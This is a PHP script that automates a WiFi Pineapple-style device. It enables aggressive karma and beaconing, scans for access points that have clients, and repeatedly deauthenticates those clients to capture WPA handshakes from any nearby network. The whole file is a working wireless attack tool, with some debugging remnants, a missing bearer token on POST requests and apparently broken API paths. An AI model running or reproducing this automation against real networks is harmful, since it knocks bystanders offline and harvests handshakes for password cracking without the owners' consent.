<?php 

run_scand();

function authorized_post($resource, $params=null, $stdout=null) {

    if (!is_null($stdout)) { echo "> ". $stdout . "\n"; }
    global $config;
    $token = authenticate(); // no refresh token support yet

echo "> Received token " . ($token) . "\n";

    $endpoint = 'http://' . $config['server_ip'] . ':' . $config['server_port'] . $resource;
    $ch = curl_init($endpoint);
    $auth_bearer_string = "Authorization: Bearer " . $token;

$curlConfig = array(
	CURLOPT_HTTPHEADER	=> array('Content-Type: application/json'),
	CURLOPT_POST		=> true,
	CURLOPT_RETURNTRANSFER	=> true
);

curl_setopt_array($ch, $curlConfig);

#    curl_setopt($ch, CURLINFO_HEADER_OUT, true);
#    curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type: application/json' , $auth_bearer_string));
#    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
#    curl_setopt($ch, CURLOPT_POST, true);

if ($resource === "/api/recon/start") {
#	echo "\n\n";
#	echo "** ch after curl_setopt**\n";
#
#	echo "[1]\n";
#	$ca = curl_getinfo ($ch);
#	print_r($ca);
#	print_r ($ca);
#	var_dump ($ca);
#	var_export ($ca);
#	echo "\n\n";
#
#	echo "[2]\n";
#	$ca2 = curl_getinfo ($ch, CURLINFO_HEADER_OUT);
#	print_r($ca2);
#	print_r ($ca2);
#	var_dump ($ca2);
#	var_export ($ca2);
#	echo "\n\n";
#
#	echo "\n";
#	echo "** json encoded params **\n";
	$json1 = json_encode($params);
	echo "> json1 = " . ($json1) . "\n";
}
    if (!is_null($params)) { echo "> Setting CURLOPT_POSTFIELDS\n"; curl_setopt($ch, CURLOPT_POSTFIELDS, $json1); }

if ($resource === "/api/recon/start") {
#	echo "  >> Calling curl_exec() with the following ch value:\n";
#	print_r($ch);
#	$ca = curl_getinfo ($ch);
#	print_r($ca);
}
    $result = curl_exec($ch);

if ($resource === "/api/recon/start") {
	echo "> curl_exec() result = " . ($result);
}

    if (curl_errno($ch)) {
        $error_msg = curl_error($ch);
        echo "Post Error: " . $error_msg . "\n"; die();
    }
    curl_close($ch);

if ($resource === "/api/recon/start") {
	$json2 = json_decode($result);
	echo "> json2 = "; print_r($json2->error); echo "\n";
#	print_r ($json2);
#	var_dump ($json2);
#	var_export ($json2);
#	echo "\n\n";
}

    return json_decode($result, false);
}

function run_scand() {
    set_aggro();
    authorized_post('/api/recon/stop', null, null);
    $scan = authorized_post('/api/recon/start', array(
        'live' => true,
        'scan_time' => 0,
        'band' => "2"
    ), null);
#    $a = gettype($scan);
#    echo "Data type of scan is " . ($a) . "\n";
#    echo "Result = \n";
#    print_r ($scan);
#    var_dump ($scan);
#    var_export ($scan);
#    echo "\n\n";

    if ($scan === null) { echo "null results returned; aborting!\n"; die(); }
    if (@$scan->scanRunning != 1) {
	echo "> Recon scan failed, check logs\n";
	set_passive();
	echo "> Exiting.\n";
	die();
    }
    echo "> Scan initiated (ID = ". $scan->scanID .")\n";
    echo "> Sleeping for 90 seconds so the recon list can populate\n";
#    sleep(90);

    while (true) {
        $scanID_endpoint = '/api/recon/scans/' . $scan->scanID;
        $scan_results = authorized_get($scanID_endpoint);
        $handshake_req = array();
        foreach ($scan_results as $key => $value) {
            if (($key == 'APResults') && is_array($value)) {
                for ($i = 0; $i < count($value); $i++) {
                    if (is_array($value[$i]->clients) && !(in_array($value[$i]->bssid, $handshake_req))) { 
                        $handshake_hdr = $value[$i];
                        echo "> Found AP with clients (". ($handshake_hdr->bssid) .")\n";
                        $params_handshake_hdr = array(
                            'ssid'          =>  '',
                            'bssid'         =>  $handshake_hdr->bssid,
                            'encryption'    =>  $handshake_hdr->encryption,
                            'hidden'        =>  $handshake_hdr->hidden,
                            'wps'           =>  $handshake_hdr->wps,
                            'channel'       =>  $handshake_hdr->channel,
                            'signal'        =>  $handshake_hdr->signal,
                            'data'          =>  $handshake_hdr->data,
                            'last_seen'     =>  $handshake_hdr->last_seen,
                            'probes'        =>  array(
                                                    'Int64' =>  $handshake_hdr->Int64,
                                                    'Valid' =>  $handshake_hdr->Valid
                            ),
                            'clients'       =>  null);
                        array_push($handshake_req, $params_handshake_hdr);
                    }
                }
            }
        }
        if (is_array($handshake_req)) {
            foreach ($handshake_req as $hs_req) {
                $bssid = $hs_req['bssid'];
                $bssid_msg = 'Starting handshake capture ('. $bssid .')';
                authorized_post('/api/pineap/handshakes/start', $hs_req, $bssid_msg);
                $cap_details = authorized_get('/api/pineap/handshakes/check', null, 'Getting status of handshake process');
                $counter = 0;
                while ($cap_details->captureRunning) {
                    authorized_post('/api/pineap/deauth/ap', json_encode(array('bssid' => $bssid)), 'De-authing clients');
                    echo "> Capture running, de-authing again in 20 seconds (" . $counter . ")\n";
                    sleep(20);
                    $counter++;
                    if ($counter == 9) { // 2mins
                        $hs = authorized_get('/api/pineap/handshakes', null, 'Checking for handshakes'); 
                        if (is_array($hs->handshakes)) { 
                            echo "> Handshake captured!\n";
                            print_r(authorized_post('/api/pineapi/handshakes/stop'));
                            break;
                        }
                        else {
                            echo "> Tried for 2 mins, moving-on to next BSSID\n";
                            authorized_post('/api/pineapi/handshakes/stop');
                        }
                    }
                }
            }
        }
        else {
            echo '> No APs w/ clients found\n';
        }
        sleep(7); // let's not kill the device
    }
    return;
}

function set_aggro() {
    $pineAP_aggro_settings = array('mode' => 'advanced', 'settings' => array(
        'ap_channel' => '11',
        'autostart' => true,
        'autostartPineAP' => true,
        'beacon_interval' => 'AGGRESSIVE',
        'beacon_response_interval' => 'AGGRESSIVE',
        'beacon_responses' => true,
        'broadcast_ssid_pool' => true,
        'capture_ssids' => true,
        'connect_notifications' => false,
        'disconnect_notifications' => false,
        'enablePineAP' => true,
        'karma' => true,
        'logging' => true,
        'pineap_mac' => '00:13:37:A8:1C:BB',
        'target_mac' => 'FF:FF:FF:FF:FF:FF'
    ));
    authorized_put('/api/pineap/settings', $pineAP_aggro_settings, 'Enabling pineAP (AGGRO settings)');
}

function set_passive() {
    $pineAP_passive_settings = array('mode' => 'passive');
    authorized_put('/api/pineap/settings', $pineAP_passive_settings, 'Switching pineAP to passive settings)');
}

function authenticate() {
    global $config;
    $endpoint = 'http://' . $config['server_ip'] . ':' . $config['server_port'] . '/api/login';
    $ch = curl_init($endpoint);
    $post = json_encode(array('username' => $config['admin_user'], 'password' => $config['admin_password']));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $post); 
    curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type: application/json'));
    $result = curl_exec($ch);
    if ($result === false) {
        echo "cURL Error: " . curl_error($ch) . "\n"; die();
    }
    elseif(curl_getinfo($ch, CURLINFO_HTTP_CODE) != 200) {
        echo "Error: " . (curl_getinfo($ch, CURLINFO_HTTP_CODE)) . (curl_error($ch)); die();
    }
    curl_close($ch);
    $token_obj = json_decode($result);
    return $token_obj->token;
}

function authorized_put($resource, $params=null, $stdout=null) {
    if (!is_null($stdout)) { echo "> ". $stdout . "\n"; }
    global $config;
    $token = authenticate(); // no refresh token support yet
    $endpoint = 'http://' . $config['server_ip'] . ':' . $config['server_port'] . $resource;
    $ch = curl_init($endpoint);
    $auth_bearer_string = "Authorization: Bearer " . $token;
    curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type: application/json' , $auth_bearer_string));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "PUT");
    if (!is_null($params)) { curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($params)); }
    $result = curl_exec($ch);
    if ($result === false) {
        echo "cURL Error: " . curl_error($ch) . "\n"; die();
    }
    elseif(curl_getinfo($ch, CURLINFO_HTTP_CODE) != 200) {
        echo "Error: " . (curl_getinfo($ch, CURLINFO_HTTP_CODE)) . (curl_error($ch)); die();
    }
    curl_close($ch);
    return json_decode($result, false);
}

function authorized_get($resource, $params=null, $stdout=null) {
    if (!is_null($stdout)) { echo "> ". $stdout . "\n"; }
    global $config;
    $token = authenticate();
    $endpoint = 'http://' . $config['server_ip'] . ':' . $config['server_port'] . $resource;
    $ch = curl_init($endpoint);
    $auth_bearer_string = "Authorization: Bearer " . $token;
    curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type: application/json' , $auth_bearer_string));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    if (!is_null($params)) { curl_setopt($ch, CURLOPT_GETFIELDS, json_encode($params)); }
    $result = curl_exec($ch);
    if ($result === false) {
        echo "cURL Error: " . curl_error($ch) . "\n"; die();
    }
    elseif(curl_getinfo($ch, CURLINFO_HTTP_CODE) != 200) {
        echo "Error: " . (curl_getinfo($ch, CURLINFO_HTTP_CODE)) . (curl_error($ch)); die();
    }
    curl_close($ch);
    return json_decode($result, false);
}
